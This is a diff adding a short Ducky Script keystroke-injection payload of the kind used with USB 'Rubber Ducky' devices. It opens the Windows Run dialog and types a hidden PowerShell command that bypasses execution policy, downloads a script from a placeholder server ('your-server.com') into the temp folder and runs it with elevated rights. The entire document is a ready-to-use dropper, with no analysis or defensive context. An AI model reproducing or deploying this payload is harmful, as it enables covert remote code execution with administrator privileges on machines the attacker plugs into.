@@ -1,0 +1,6 @@
+DELAY 1000
+GUI r
+DELAY 500
+STRING powershell -NoP -NonI -W Hidden -Exec Bypass -Command "Invoke-WebRequest -Uri 'https://your-server.com/payload.ps1' -OutFile '$env:temp\payload.ps1'; Start-Process powershell -ArgumentList '-ExecutionPolicy Bypass -File $env:temp\payload.ps1' -Verb RunAs"
+DELAY 1000
+ENTER
